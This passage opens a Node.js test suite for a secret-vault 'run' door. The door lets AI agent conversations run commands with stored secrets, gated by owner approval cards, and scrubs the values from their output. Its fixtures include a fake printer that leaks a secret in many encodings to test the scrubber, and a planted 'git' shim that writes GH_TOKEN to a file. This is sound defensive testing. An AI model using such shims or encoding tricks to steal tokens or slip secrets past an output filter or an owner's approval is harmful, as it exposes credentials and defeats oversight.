#!/usr/bin/env node
// test-vault-run — THE DOOR of `vibespace-vault run` (lane vault-run-door, design q-043 §8 + §5 P0-f): src/server/vault-run-door.js
// over the PURE src/vault-run.js, a REAL vault engine on a scratch dir, the REAL For-you store, and REAL children (a fake
// printer that leaks the value in every form, split across pipe chunks). Fast tier, in-process.
//   ① THE SWITCH (decision ⑤) — off by default ⇒ entry_not_runnable BY NAME; ON needs 验证是你; a login / pairing / channel
//      token, a hub secret, a sign-in kind is refused BY NAME on the switch AND at the run — even when the store is forced
//      'opened', even when the model's ownDoorOf is made to say yes (the engine's own class check); the store is MARKED by the
//      vault (a hand edit reads as empty, said in the audit)
//   ② THE SCRUB — env / a 0600 file ($VAULT_FILE) / a template / stdin: the child prints the value raw, base64 (std / URL /
//      inside `Basic user:pass`), percent, JSON and hex (upper / lower) and — lane vault-scrub-forms — UTF-16 LE / BE (bytes),
//      base32, quoted-printable, a Python bytes repr, HTML entities, colour escapes and wrapped base64, every one cut across
//      two pipe chunks, on stdout AND stderr ⇒ an independent decoding oracle (every view: colours stripped, lines joined, QP /
//      \xNN / entities decoded, NULs dropped) finds 0 bytes of it in what the agent gets; ONE WINDOW PER RUN: a value split
//      between stdout and stderr is masked; a long new form across the 2 MiB cut is dropped whole; the file is 0600 in a 0700 dir
//      and gone after the run; the exit code passes; 2 MiB cut; the refusals (argv, a print tool, a short value, a hidden
//      character, a cut card, a job, a remote conversation, --on, a cwd or a template outside the fence, no such tool)
//   ③ THE CARD (decisions ② ④) — a NEW shape draws the card on a cluster AND a local instance; a local one runs a SEEN shape
//      without asking, a cluster asks every time; «always» (验证是你 first; never for a shell / an interpreter) runs the
//      shape without asking; deny / no answer / the card closed by another door / a changed item / a second run of the same
//      shape / the caller gone / a lock — each refused by name, nothing runs; the card shows the whole run, never a value
//   ④ THE LOCK (decision ③) — a lock mid-run: the child (deaf to SIGTERM) is gone within its bound, the answer is
//      vault_locked, the run folder is gone, the owner's For-you list names the conversation; a locked vault refuses first
//   ⑤ THE AUDIT — one vault-run line per run and refusal: the actor, the shape, the entries, the exit, the scrubbed bytes —
//      the oracle finds no value in data/vault-audit.jsonl, data/user-todos.json or data/vault-run.json
//   ⑥ THE TIMEOUT — `--timeout 1` stops the child, said
//   ⑥b A RUN ENDS WHOLE (the security review) — a backgrounded child in the group and a setsid'd one that ignores SIGTERM are
//      gone when the run ends, on a lock too; the boot sweep shreds a GONE hub's folder after ending its marked strays and
//      leaves a LIVE hub's alone; a grandchild holding the pipes mid-value never flushes half of it; the store's mark (a
//      non-hex mark reads as empty, never a throw), its generation (a restored older copy = a replay, read as empty),
//      switch-off taking its «always» back; bounded requests; the program on the card (a writable one gets no «always»);
//      the folder's hidden characters; `list` spelling an entry with !'()*
//   ⑦ MUTANTS — patched copies of the door RED: a new shape without a card; an audit line carrying a value; two scrubbers
//      (one per pipe — the split leaks); a cut that flushes the held tail (the edge leaks)
//   ⑧ PINS — the headers (the three holes, the sieve, write-then-cat accepted and audited), the wiring
//   ⑨ THE CARD ON THE PAGE — the For-you window's buttons (PURE itemView: Allow once / Always for this shape / Deny, no
//      «always» when not offered), the popup row, «always» and the switch asking 验证是你 FIRST, a typed reply never answering
//   ⑩ THE REQUEST AND ITS GRANT (lane vault-manual-and-lock — design D4): a closed entry's refusal names `request`; a request
//      lands ONCE (agent, entry, purpose — no expiry), a second for the same entry while one is open ⇒ request_pending by
//      name; its refusals by name; Allow once = a grant the run verdict honours for THAT conversation (the shape card still
//      asks) and spends; 8 hours = every run; deny / the card closed elsewhere / a changed item / a gone conversation grant
//      nothing; the switch OFF and a LOCK end every grant and withdraw every request; the use lines carry the purpose and the
//      run's receipt and `uses` reads back this conversation's alone; the request's card on the page
//   ⑪ THE OWN ROAD (lane vault-agent-own — the owner 2026-10-26: 「它自己存的使用为啥还要我的允许？」) — on a CLUSTER (which asks every
//      run of anything else): its own STORED entry runs with no switch, no grant, no card — scrubbed, its run line allowedBy
//      'own', its use line (door run, ok, the receipt); a resumed conversation (a new registered id, its durable one kept)
//      runs it too, a pending fork and another conversation are refused by name; its own MINTED entry runs to its --for host
//      with no card, to ANOTHER host draws ONE card naming both hosts (who stored it, why it asks; no «always») and after one
//      允许 that host runs without a card — until a LOCK ends the pass; ROUND 2: a known tool naming no host it can read
//      (`curl -s`) asks; a BLIND shape (a shell, `node -e`) asks EVERY run on a cluster (one 允许 is not kept), a blind shape
//      «always» is offered for (curl --resolve) passes after «always» + the second password until the lock ends the 8-hour
//      one; a LOCAL instance asks once and then runs that shape with no card; a lock still ends an own run mid-run; a
//      request for it answers `already: 'own'` (no card; a minted one says so and names its host); list names it (by own) to
//      its conversation only; the Vault row has no switch; the owner's entry still draws today's card, now saying who stored
//      it and why it asks
//   ⑩b THE CAP'S SHAPE (B-4934, q-043 verify L2): eight conversations × 8 open asks, then a NINTH conversation's first ask
//      is FILED (MUTANT: the old 64-request hub-wide cap ⇒ RED); one conversation's 9th ⇒ too_many_requests by name; 32
//      conversations asking ⇒ the 33rd too_many_askers by name while one already asking still asks; more than 8 asking ⇒
//      ONE Vault notice «N conversations are asking», re-worded in place, closed at 8 or fewer, quiet once the owner set it
//      aside, closed by a lock and by a boot
//   ⑬ THE HOME CENSUS (B-f1d3, lane lg-vault-env) — EVERY KNOWN_TOOLS row driven through the REAL door (a capturing spawn),
//      the hub's env carrying every pin's variable at a PLANTED dir: the child's HOME / XDG_* / pins / argv read against the
//      row's TOOL_HOME_SEAL entry; what is still OPEN is pinned BY ROW (a ratchet: a sealed row leaves the list)
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createRequire } from 'node:module';
import { pathToFileURL } from 'node:url';
import { scratchDir, anchored } from './scratch.mjs';
import { mutantCopies, copiesCensus } from './mutant-copy.mjs';
const require = createRequire(import.meta.url);
const REPO = path.resolve(new URL('..', import.meta.url).pathname);
const R = (rel) => require(path.join(REPO, rel));
let pass = 0, fail = 0;
const ok = (c, n, e) => { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e !== undefined ? '\n    ' + String(typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 900) : '')); } };
// B-0d3e: a red control's product edit, its anchor judged BY NAME — any count but one (for 'all' / 'join' / 'first' or a /g
// anchor: none) is a red row of this suite's own check naming the anchor and the file; the copy is then built as before (nothing
// crashes). 'first' = an anchor the product holds more than once today: the first one is patched, as it always was
function editAnchor(text, from, to, file, mode = 'one') {
  const t = String(text), re = from instanceof RegExp, many = mode !== 'one' || (re && from.global);
  const n = re ? [...t.matchAll(new RegExp(from.source, from.flags.replace(/[gy]/g, '') + 'g'))].length : t.split(String(from)).length - 1;
  if (many ? n === 0 : n !== 1) { const shown = re ? String(from) : JSON.stringify(String(from)).slice(0, 100); ok(false, `ANCHOR (${file}): ${shown} — found ${n} times, ${many ? 'at least one' : 'one'} meant: the copy is not the control it says`); }
  return mode === 'join' ? t.split(from).join(to) : mode === 'all' ? t.replaceAll(from, to) : t.replace(from, to);
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const VE = R('src/server/vault-engine.js');
const DOOR = R('src/server/vault-run-door.js');
const VR = R('src/vault-run.js');
const { UserTodoManager, DETAIL_MAX } = R('src/user-todos.js');
const ROOT = scratchDir('vaultrun');   // r1152: never `vault-run` — /tmp/vs-vault-run-… is the vault run door's own folder shape (its start sweep judges it)
// THE SUITE'S OWN HOME AND ENVIRONMENT (主开发 2026-11-19 00:56Z — a suite judges the same under the kit and under a caller's whole
// environment: the kit hands a fresh empty home and a minimal env, the tree's fast tier or a probe the caller's own). Every door this
// suite builds gets SUITE_HOME as its home and SUITE_ENV (+ its PATH) as the agent env — never os.homedir() nor process.env; the
// mark below is the caller's; the leg through world()'s OWN default door proves no run sees it (the printer door's check beside it
// holds by construction — its env is built inline from SUITE_ENV).
const SUITE_HOME = path.join(ROOT, 'home'); fs.mkdirSync(path.join(SUITE_HOME, 'Downloads'), { recursive: true });
// THE SUITE'S OWN TEMP FOLDER = its scratch root: the scratch root sits under /tmp WHATEVER the caller's TMPDIR says (src/fixture-guard.js
// TMP_ROOTS), while a door's temp folder defaulted to os.tmpdir() — under a caller's own TMPDIR every world's folder fell outside the
// fence (cwd_refused) wherever a leg ran in a folder that is not its caller's project (the throwaway probe's reading, 2026-11-19)
const SUITE_TMP = ROOT;
// …a temp folder only where a leg PINS it: every door world() builds gets SUITE_TMP (a leg may hand its own, B-7f97's privTmp); a door
// built outside world() and the suite's own process (Node's os.tmpdir(): mutant copies, a leg's own mkdtemp) still follow the caller's TMPDIR.
const SUITE_ENV = Object.freeze({ HOME: SUITE_HOME, PATH: [path.dirname(process.execPath), '/usr/local/bin', '/usr/bin', '/bin'].join(':'), TMPDIR: SUITE_TMP, LANG: 'C.UTF-8' });
process.env.VS_SUITE_CALLER_MARK = 'the-caller-env';   // a variable only the CALLER's environment carries
const M = mutantCopies('vaultrun', REPO);   // r1152: its folder /tmp/vs-vaultrun-mut-<pid> (was vs-vault-run-mut-<pid>: a hub's start sweep shredded it mid-run)
const PW = 'the second password of the run suite';
// the values: odd characters every form spells differently ( / + = & " \ and a non-ASCII letter)
const VALUE = 'Vr-S3cret/value+with=odd&chars"\\ü-0123';
const VALUE2 = 'app-login-pass-9876543210';
const VALUE3 = 'account-api-key-value-000111222';
const SHORT = 'abc1234';

// ── THE FAKES: one bin dir first on the child's PATH — a printer (node), a curl (a known tool: «always» is offered) ──
const BIN = path.join(ROOT, 'bin'); fs.mkdirSync(BIN, { recursive: true });
const PRINTER = path.join(BIN, 'printer.js');
fs.writeFileSync(PRINTER, `// stale-pins: kept (the fake printer's own spawn below, not a pin on src/jobs.js)
const fs = require('fs'), path = require('path');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const [mode, arg] = process.argv.slice(2);
(async () => {
  if (mode === 'hang') { process.on('SIGTERM', () => {}); fs.writeFileSync(arg, String(process.pid)); setInterval(() => {}, 1000); return; }
  if (mode === 'sleep') { fs.writeFileSync(arg, String(process.pid)); setInterval(() => {}, 1000); return; }
  if (mode === 'bg' || mode === 'stray') {   // a child left behind: in the run's group (bg) or in its own session, deaf to SIGTERM (stray)
    const k = require('child_process').spawn(process.execPath, ['-e', 'process.on("SIGTERM",()=>{}); setInterval(()=>{},1000)'], { detached: mode === 'stray', stdio: 'ignore' });
    fs.writeFileSync(arg, String(k.pid)); k.unref(); return;
  }
  if (mode === 'pipehold') {   // a grandchild in its own session holds stdout and prints HALF the value, then waits; the child leaves
    const v = process.env.T;
    require('child_process').spawn(process.execPath, ['-e', 'process.stdout.write("<" + process.argv[1]); setInterval(()=>{},1000)', v.slice(0, 14)], { detached: true, stdio: ['ignore', 'inherit', 'ignore'] }).unref();
    return;
  }
  if (mode === 'ran') { fs.writeFileSync(arg, 'ran'); return; }
  if (mode === 'nice') { process.stdin.on('data', () => {}); process.stdin.on('end', () => process.stdout.write('NICE ' + require('os').getPriority())); return; }   // B-7f18: the run's own niceness, read by itself once its stdin closed (the door writes it after the set)
  if (mode === 'json') { const v = process.env.T, b = Buffer.from(v); process.stdout.write('{"meta":{"rc":"ok"},"key":"deadbeefcafef00dba5eba11","use_auth":false,"site":"HQ","auth":"' + b.toString('base64') + '","raw":"' + v + '","ok":true}\\n'); return; }
  if (mode === 'split') { const v = process.env.T, h = v.length >> 1; process.stdout.write('<' + v.slice(0, h)); await sleep(40); process.stderr.write(v.slice(h) + '>\\n'); await sleep(40); process.stdout.write(' tail\\n'); return; }   // ONE value, half on each pipe
  if (mode === 'drip') { for (let i = 0; i < 10; i++) { process.stdout.write('drip ' + i + (i === 4 ? ' ' + process.env.T : '') + '\\n'); await sleep(5); } return; }   // ten pieces 5 ms apart, the value in the fifth (THE BOUND ON SILENCE's lawful slow run)
  if (mode === 'soft') { process.stdout.write('token=' + process.env.T + '\\n' + '=\\n'.repeat(150000) + 'done\\n'); return; }   // 300 KB of soft breaks after the value: the QP view holds them, each turn rescans the hold (THE SCAN OFF THE LOOP's costly output)
  if (mode === 'edge2') { process.stdout.write('x'.repeat(2 * 1024 * 1024 - 60) + [...process.env.T].map((c) => '&#' + c.codePointAt(0) + ';').join('') + 'y'.repeat(4096)); return; }   // a LONG new form across the 2 MiB cut
  if (mode === 'edge3') { process.stdout.write(Buffer.concat([Buffer.from('x'.repeat(2 * 1024 * 1024 - 40)), Buffer.from(process.env.T, 'utf16le'), Buffer.from('y'.repeat(4096))])); return; }
  let v;
  if (mode === 'env') v = process.env.T;
  else if (mode === 'file') { const st = fs.statSync(arg), dst = fs.statSync(path.dirname(arg)); process.stdout.write('FILE ' + (st.mode & 0o777).toString(8) + ' ' + (dst.mode & 0o777).toString(8) + ' ' + path.dirname(arg) + '\\n'); v = fs.readFileSync(arg, 'utf8'); }
  else if (mode === 'template') v = fs.readFileSync(arg, 'utf8').replace(/^token=/, '').replace(/\\n$/, '');
  else if (mode === 'stdin') v = fs.readFileSync(0, 'utf8').replace(/\\n$/, '');
  else if (mode === 'big') { process.stdout.write('x'.repeat(3 * 1024 * 1024)); process.stdout.write(process.env.T); return; }
  else if (mode === 'edge') { process.stdout.write('x'.repeat(2 * 1024 * 1024 - 12) + process.env.T + 'y'.repeat(4096)); return; }   // the value ACROSS the 2 MiB cut
  const b = Buffer.from(v);
  const forms = [v, b.toString('base64'), b.toString('base64url'), b.toString('base64').replace(/=+$/, ''), encodeURIComponent(v), encodeURIComponent(v).toLowerCase(), JSON.stringify(v), JSON.stringify(v).slice(1, -1), b.toString('hex'), b.toString('hex').toUpperCase(), 'Authorization: Basic ' + Buffer.from('user:' + v).toString('base64'), 'Basic ' + Buffer.from('ab:' + v).toString('base64')];
  // lane vault-scrub-forms: what a real producer prints by itself (base32, a quoted-printable body, a Python bytes repr, HTML
  // entities, colour escapes, base64 wrapped at 76) — and UTF-16 as BYTES (the door decodes them)
  const bits = [...b].map((x) => x.toString(2).padStart(8, '0')).join(''); let b32 = ''; for (let i = 0; i < bits.length; i += 5) b32 += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'[parseInt(bits.slice(i, i + 5).padEnd(5, '0'), 2)]; b32 += '='.repeat((8 - (b32.length % 8)) % 8);
  const qp = [...b].map((x) => (x >= 33 && x <= 126 && x !== 61 ? String.fromCharCode(x) : '=' + x.toString(16).padStart(2, '0').toUpperCase()));
  forms.push(b32, b32.replace(/=+$/, '').toLowerCase(), qp.slice(0, 9).join('') + '=\\r\\n' + qp.slice(9).join(''),
    "b'" + [...b].map((x) => (x === 92 ? '\\\\\\\\' : x === 39 ? "\\\\'" : x >= 32 && x < 127 ? String.fromCharCode(x) : '\\\\x' + x.toString(16).padStart(2, '0'))).join('') + "'",
    [...v].map((c) => '&#' + c.codePointAt(0) + ';').join(''), [...v].map((c, i) => (i && i % 4 === 0 ? '\\x1b[0m' : '') + c).join(''),
    Buffer.from('x'.repeat(48) + v).toString('base64').replace(/(.{76})/g, '$1\\n'));
  // each spelling cut across two chunks on BOTH pipes at once — the other pipe's half arrives between a pipe's two halves
  // (the run's one scrubber reads each pipe on its own too, lane vault-scrub-forms)
  const pipes = [process.stdout, process.stderr];
  for (const f of forms) { const h = f.length >> 1; for (const out of pipes) out.write('<' + f.slice(0, h)); await sleep(6); for (const out of pipes) out.write(f.slice(h) + '>\\n'); }
  for (const f of [Buffer.from(v, 'utf16le'), Buffer.from(v, 'utf16le').swap16()]) { const h = f.length >> 1; for (const out of pipes) out.write(Buffer.concat([Buffer.from('<'), f.subarray(0, h)])); await sleep(6); for (const out of pipes) out.write(Buffer.concat([f.subarray(h), Buffer.from('>\\n')])); }
  process.stdout.write('DONE ' + mode + '\\n');
  process.exitCode = 3;
})();
`);
const CURL = path.join(BIN, 'curl');
fs.writeFileSync(CURL, `#!/usr/bin/env node\nprocess.stdout.write('curl got ' + process.env.T + '\\n');\n`, { mode: 0o555 });
const WCURL = path.join(ROOT, 'wbin', 'curl');   // the same fake in a folder an agent can write (no «always» for it)
fs.mkdirSync(path.dirname(WCURL), { recursive: true }); fs.copyFileSync(CURL, WCURL); fs.chmodSync(WCURL, 0o755);
fs.chmodSync(BIN, 0o555);   // read-only: the door's programWritable is false for BIN/curl (given back at the end)
const NODE = process.execPath;
// round 10 (BLOCKER 1b): a fake gh in a NON-writable bin (so resolveTool finds it, programWritable is false) and a WRITABLE dir
// FIRST on the agent's PATH holding a `git` shim — the spawn-env seal must drop the writable dir (no agent git at the head) and
// point HOME + GH_CONFIG_DIR at a hub-owned dir under data/ (the agent's ~/.config/gh is bypassed; the token still rides env).
const GHBIN = path.join(ROOT, 'ghbin'); fs.mkdirSync(GHBIN, { recursive: true });
fs.writeFileSync(path.join(GHBIN, 'gh'), "#!/usr/bin/env node\nprocess.stdout.write('gh-fake\\n');\n", { mode: 0o555 });
fs.chmodSync(GHBIN, 0o555);
const WSEAL = path.join(ROOT, 'wseal'); fs.mkdirSync(WSEAL, { recursive: true });   // agent-writable (0755) — a shim at the PATH head
fs.writeFileSync(path.join(WSEAL, 'git'), "#!/usr/bin/env node\nrequire('fs').writeFileSync(process.env.STEAL||'/dev/null', process.env.GH_TOKEN||'');\n", { mode: 0o755 });
const NOTYET = path.join(ROOT, 'notyet-bin');   // round 11 (MAJOR 2): a dir that does NOT exist yet — the sealed PATH must DROP it (the unit bakes $HOME/.local/bin before the agent makes it), re-checked every spawn
// round 12: a test cannot chown a scratch binary to root, so the ownership check is an injectable door seam. The DEFAULT door (the
// card / run legs) models the "installed tool" dirs (BIN, GHBIN, the node prefix) + the real system dirs as ROOT-owned; the
// agent-writable WSEAL / NOTYET / work dirs are not. ⑫ instead passes the REAL DOOR.rootOwnedNoWrite to drive the actual rule.
const TRUSTED_ROOT = [BIN, GHBIN, path.dirname(NODE), '/usr/local/bin', '/usr/bin', '/bin'];
const isRootOwnedTest = (p) => TRUSTED_ROOT.some((d) => p === d || p.startsWith(d + '/'));
const { EventEmitter } = require('node:events');

// THE ORACLE: does `text` carry any byte of `value` — raw, any 10-character window of it, or after decoding every base64 /
// hex / percent run and every JSON string in it (Node's own decoders, not the scrubber's forms)
// lane vault-scrub-forms: the oracle reads EVERY view a real producer's spelling needs — colours stripped, lines joined,
// quoted-printable / \xNN / HTML entities decoded, the NULs of UTF-16 dropped, base32 runs decoded — each with its own
// decoder written here (never the module's)
const VIEWS_OF = (t) => {
  const latin = (s) => Buffer.from(s, 'latin1').toString('utf8');
  return [t, t.replace(/\x1b\[[0-9;]*[mK]/g, ''), t.replace(/[\r\n]/g, ''), latin(t.replace(/=\r?\n/g, '').replace(/=([0-9A-Fa-f]{2})/g, (m, h) => String.fromCharCode(parseInt(h, 16)))),
    latin(t.replace(/\\x([0-9A-Fa-f]{2})/g, (m, h) => String.fromCharCode(parseInt(h, 16))).replace(/\\\\/g, '\\')), t.replace(/&#(\d+);/g, (m, d) => String.fromCodePoint(+d)).replace(/&#x([0-9a-f]+);/gi, (m, h) => String.fromCodePoint(parseInt(h, 16))), t.replace(/\0/g, '')];
};
const unb32 = (s) => { const bits = [...s.toUpperCase().replace(/=+$/, '')].map((c) => 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'.indexOf(c).toString(2).padStart(5, '0')).join(''); const out = []; for (let i = 0; i + 8 <= bits.length; i += 8) out.push(parseInt(bits.slice(i, i + 8), 2)); return Buffer.from(out).toString('utf8'); };
function leaks(text, value) {
  const out = [];
  for (const t of VIEWS_OF(String(text || ''))) out.push(...leaksIn(t, value));
  for (const m of String(text || '').matchAll(/[A-Za-z2-7]{16,}=*/g)) if (/^[A-Z2-7]+=*$|^[a-z2-7]+=*$/.test(m[0]) && unb32(m[0]).includes(String(value))) out.push('base32');
  return [...new Set(out)];
}
function leaksIn(text, value) {
  const t = String(text || ''), v = String(value), out = [];
  if (t.includes(v)) out.push('raw');
  for (let i = 0; i + 10 <= v.length; i++) if (t.includes(v.slice(i, i + 10))) { out.push('raw-window@' + i); break; }
  const pct = (x) => { try { return Buffer.from(x.replace(/%([0-9A-Fa-f]{2})/g, (m, h) => String.fromCharCode(parseInt(h, 16))), 'latin1').toString('utf8'); } catch { return ''; } };
  if (pct(t).includes(v) || pct(t.replace(/\+/g, '%20')).includes(v)) out.push('percent');   // a form's `+` for a space too
  for (const m of t.matchAll(/[A-Za-z0-9+/_-]{12,}={0,2}/g)) for (let k = 0; k < 4; k++) for (const enc of ['base64', 'base64url']) { const d = Buffer.from('A'.repeat(k) + m[0], enc).toString('utf8'); if (d.includes(v)) { out.push('base64'); break; } }
  for (const m of t.matchAll(/[0-9A-Fa-f]{16,}/g)) for (const k of [0, 1]) { const s = m[0].slice(k); const d = Buffer.from(s.slice(0, s.length - (s.length % 2)), 'hex').toString('utf8'); if (d.includes(v)) out.push('hex'); }
  for (const m of t.matchAll(/"(?:[^"\\\n]|\\.)*"/g)) { try { if (String(JSON.parse(m[0])).includes(v)) out.push('json'); } catch { } }
  return [...new Set(out)];
}
ok(leaks('a ' + VALUE + ' b', VALUE).length && leaks(Buffer.from('user:' + VALUE).toString('base64'), VALUE).includes('base64') && leaks(Buffer.from(VALUE).toString('hex').toUpperCase(), VALUE).includes('hex') && leaks(encodeURIComponent(VALUE), VALUE).includes('percent') && leaks(JSON.stringify({ v: VALUE }), VALUE).includes('json') && !leaks('[vault:mounts/m1/secretKey] nothing here', VALUE).length,
  'THE ORACLE (independent of the scrubber): Node\'s own decoders find the value raw, in base64 inside Basic, upper hex, percent and JSON — and nothing in a placeholder');
{ const v = VALUE2, u16 = (x) => { const d = new (require('node:string_decoder').StringDecoder)('utf8'); return d.write(x) + d.end(); };
  const seen = [[u16(Buffer.from(v, 'utf16le')), 'UTF-16LE'], [[...v].map((c) => '&#' + c.codePointAt(0) + ';').join(''), 'entities'], [[...v].map((c, i) => (i && i % 4 === 0 ? '\x1b[0m' : '') + c).join(''), 'colours'], [[...Buffer.from(v)].map((x) => '=' + x.toString(16).toUpperCase()).join('').replace(/^(.{30})/, '$1=\r\n'), 'quoted-printable'], [[...Buffer.from(v)].map((x) => '\\x' + x.toString(16)).join(''), '\\xNN'], [Buffer.from(v).toString('base64').replace(/(.{8})/g, '$1\n'), 'wrapped base64']];
  const miss = seen.filter(([x]) => !leaks(x, v).length).map(([, n]) => n);
  ok(!miss.length && leaks('JZTW4ZDPOU', 'not-there').length === 0, 'THE ORACLE reads the new spellings in the clear too (UTF-16LE, entities, colours, quoted-printable, \\xNN, wrapped base64) — so a 0 below is not vacuous', miss); }

// ── A WORLD: a real engine (set up, unlocked), the real For-you store, stores with rows, the door ──
const ROWS = {
  mounts: [{ entry: 'm1', field: 'secretKey', label: 'my bucket', cipher: 'x'.repeat(60), v: VALUE }, { entry: "b(x)!'*", field: 'secretKey', label: 'odd name', cipher: 'x'.repeat(60), v: VALUE }, { entry: 'm2', field: 'secretKey', label: 'tiny', cipher: 'x'.repeat(40), v: SHORT }, { entry: 'm4', field: 'session', label: 'sess', kind: 'session-token', cipher: 'x'.repeat(60), v: VALUE }],
  'app-secrets': [{ entry: 'app1', field: 'item.0.1', label: 'app login', bytes: VALUE2.length, v: VALUE2 }],
  accounts: [{ entry: 'acct1', field: 'apiKey', label: 'my account', kind: 'api-key', bytes: VALUE3.length, v: VALUE3 }],
  channels: [{ entry: 'lark1', field: 'token', label: 'lark', kind: 'token', bytes: 40, v: 'channel-token-abcdefghijklmnop' }],
  secrets: [{ entry: 'host:dev1', field: 'token', label: 'link', bytes: 40, v: 'pairing-token-abcdefghijklmnop' }, { entry: 'agent:conv-1/gh-token', field: 'secret', label: 'Agent secret · gh-token', bytes: 30, v: 'agent-minted-value-0123456789' },
    { entry: 'agent:conv-1/site-pw', field: 'secret', label: 'Agent secret · site-pw', bytes: 29, provenance: { by: 'agent', prov: 'minted', sawPlaintext: false, actor: 'Lane X', forHost: 'api.example.com' }, v: 'agent-minted-pw-0123456789abc' },
    { entry: 'agent:conv-1/gh-mint', field: 'secret', label: 'Agent secret · gh-mint', bytes: 30, provenance: { by: 'agent', prov: 'minted', sawPlaintext: false, actor: 'Lane X', forHost: 'github.com' }, v: 'agent-minted-ghv-0123456789abc' }, { entry: 'agent:conv-1/gh-ghe', field: 'secret', label: 'Agent secret \u00b7 gh-ghe', bytes: 31, provenance: { by: 'agent', prov: 'minted', sawPlaintext: false, actor: 'Lane X', forHost: 'ghe.example.test' }, v: 'agent-minted-ghe-0123456789abcd' }],   // round 16: a MINTED own entry --for a GHES host (the two_hosts BLOCKER: a <url> positional's host != the -R / GH_HOST host)   // lane vault-agent-own (r13): a MINTED own entry --for github.com (the cross-host minor: a call -R ghe.* approved on a card homes to the APPROVED host)   // lane vault-agent-own: a MINTED own entry, --for api.example.com
};
const sourceOf = (store) => ({ vaultRows: () => ROWS[store].map(({ v, ...r }) => r), vaultReveal: (e, f) => { const r = ROWS[store].find((x) => x.entry === e && x.field === f); return r ? r.v : null; } });
const CALLER = { conversationId: 'conv-1', sessionKey: 'claude:conv-1', name: 'Lane X', cwd: null };
let worldN = 0;
async function world({ instance = 'local', killGraceMs = 400, askMs = null, lateMs = null, doorMod = DOOR, setup = true, pipeGraceMs = 300, doorExtra = {} } = {}) {   // doorExtra: the door's own seams (its scrubber worker's file, figures, silence bound)
  const dir = path.join(ROOT, 'w' + (++worldN)); const dataDir = path.join(dir, 'data'), work = path.join(dir, 'work'), runRoot = path.join(dir, 'run');
  for (const d of [dataDir, work, runRoot]) fs.mkdirSync(d, { recursive: true });
  const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: { log() {}, warn() {} }, idleTimer: false, register: false });
  if (setup) await vault.setup(PW);
  const userTodos = new UserTodoManager({ dataDir, expirySweepMs: 3600e3 });
  const logs = [];
  const timerLog = [];   // every bound the door set (ms) — a bound is proven by the timer the door armed, never by a wall clock
  const timers = { set: (fn, ms) => { timerLog.push(ms); return setTimeout(fn, askMs != null && ms === VR.ASK_TTL_MS ? askMs : lateMs != null && ms === DOOR.LATE_TTL_MS ? lateMs : ms); }, clear: (h) => clearTimeout(h) };
  const gone = new Set();
  const mk = (mod = doorMod, extra = {}) => mod.create({ dataDir, vault, userTodos, sources: Object.fromEntries(Object.keys(ROWS).map((s) => [s, () => sourceOf(s)])), instanceKind: () => instance,
    runRoot: () => runRoot, home: SUITE_HOME, tmpDir: SUITE_TMP, agentEnv: () => ({ ...SUITE_ENV, PATH: BIN + ':' + SUITE_ENV.PATH }), killGraceMs, pipeGraceMs, timers, liveOf: (cid) => !gone.has(cid), log: (m) => logs.push(String(m)), isRootOwned: isRootOwnedTest, ...extra });   // round 10: extra deps (a capturing spawnImpl, a PATH-with-a-writable-head agentEnv) for the spawn-env seal test
  const door = mk(doorMod, doorExtra);
  return { dir, dataDir, work, runRoot, vault, userTodos, door, logs, gone, mk, timerLog, caller: { ...CALLER, cwd: work } };
}
const cardsOf = (w) => (w.userTodos.snapshot().open || []).filter((i) => i.action && i.action.type === 'vault-run-ask');
async function waitCard(w, ms = 3000) { const t = Date.now(); while (Date.now() - t < ms) { const c = cardsOf(w); if (c.length) return c[c.length - 1]; await sleep(5); } return null; }
/** A run whose card (if one comes) is answered `answer`. → { r, card, a } */
async function runAnswered(w, args, { answer = 'once', reauthed = false, door = w.door, caller = w.caller, cwd = w.work, ttl } = {}) {
  let settled = false;
  const p = door.run({ caller, args, cwd }).then((r) => { settled = true; return r; });
  let card = null;
  const t = Date.now();
  while (!settled && Date.now() - t < 3000) { const c = cardsOf(w); if (c.length) { card = c[c.length - 1]; break; } await sleep(5); }
  if (answer === null) return { r: p, card, a: null };   // the caller answers (or not) itself — `r` is the pending run
  let a = null;
  if (card && answer) a = door.answer(card.action.askId, { answer, reauthed, ...(ttl ? { ttl } : {}) });
  return { r: await p, card, a };
}
const openRow = (w, id = 'mounts:m1#secretKey') => w.door.setRunnable({ id, on: true, reauthed: true });
const ENV = (mode, ...rest) => ['--env', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, mode, ...rest];
const auditOf = (w) => { try { return fs.readFileSync(path.join(w.dataDir, 'vault-audit.jsonl'), 'utf8'); } catch { return ''; } };
const runLines = (w) => auditOf(w).split('\n').filter(Boolean).map((l) => JSON.parse(l)).filter((x) => x.event === 'vault-run');
const runDirs = (w) => fs.readdirSync(w.runRoot).filter((x) => x.startsWith(DOOR.RUN_DIR_PREFIX));
const alive = (pid) => { try { process.kill(pid, 0); return true; } catch { return false; } };
const PH1 = '[vault:mounts/m1/secretKey]';
/** ONE value, half on stdout and half on stderr (40 ms apart) → { ok, so, se, lk } (lane vault-scrub-forms). */
async function splitLeg(w, door = w.door) {
  if (!w.door.rowFacts({ id: 'mounts:m1#secretKey' }).open) openRow(w);
  const { r } = await runAnswered(w, ENV('split'), { door });
  const so = r.stdout || '', se = r.stderr || '';
  return { ok: !!r.ok, so, se, lk: [...leaks(so + se, VALUE), ...leaks(se + so, VALUE), ...leaks(so.split(PH1).join('') + se.split(PH1).join(''), VALUE)] };
}

console.log('① THE SWITCH — the owner opens an entry for runs; a login / pairing / channel token never');
{
  const w = await world();
  const r0 = await w.door.run({ caller: w.caller, args: ENV('env'), cwd: w.work });
  ok(r0.code === 'entry_not_runnable' && r0.ref === 'vault://mounts/m1/secretKey' && /Usable by agent runs/.test(r0.words) && !cardsOf(w).length, 'an entry NOT opened for runs ⇒ entry_not_runnable BY NAME (the reference, the Vault window\'s switch) — no card, nothing ran', r0);
  ok(w.door.rowFacts({ id: 'mounts:m1#secretKey', store: 'mounts' }).open === false && w.door.rowFacts({ id: 'mounts:m1#secretKey', store: 'mounts' }).can === true, 'the switch is OFF by default (the Vault window\'s row: can, not open)');
  const s1 = w.door.setRunnable({ id: 'mounts:m1#secretKey', on: true });
